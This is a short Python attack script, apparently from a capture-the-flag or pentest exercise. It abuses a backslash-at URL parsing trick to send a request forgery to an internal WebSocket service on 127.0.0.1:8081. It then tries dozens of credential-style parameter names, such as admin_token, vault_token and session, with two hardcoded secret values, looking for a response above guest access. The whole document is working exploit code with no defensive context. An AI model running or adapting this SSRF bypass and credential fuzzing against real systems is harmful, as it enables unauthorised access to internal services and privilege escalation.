import time, select
from ws import connect, recv_frame
TOK="9f2c7e14a6b3d508c1e04f7a2b8d6350a17e9c4b2d6f8035e1c9a7b4d2f60813"
SEED="9b62aed8c3d31cc08cb70535ee8917176125acc68bf3191617773c452d16cc48"
names=["token","auth","admin_token","vault_token","key","apikey","api_key","secret","sig","signature",
"session","sid","partner","partner_id","identity","role","user","pass","password","credential",
"credentials","access_token","auth_token","admin","ops","maintenance","debug","internal","v","version"]
def trial(q):
    inner=f"http://rates.partner-forex.example.com\\@127.0.0.1:8081/ws?{q}"
    try:
        s,resp=connect(inner=inner); s.setblocking(False)
        out=[]; end=time.time()+0.7
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.08)
            if r:
                try: out.append(recv_frame(s)[1])
                except Exception: out.append(b"EOF"); break
        s.close(); return out
    except Exception: return None
hit=0
for n in names:
    for v in [TOK,SEED]:
        out=trial(f"{n}={v}")
        rdy=[x for x in out or [] if isinstance(x,bytes) and x.startswith(b"READY")]
        if rdy and rdy[0]!=b"READY guest":
            print("HIT",n,rdy,flush=True); hit+=1
print("hits",hit)
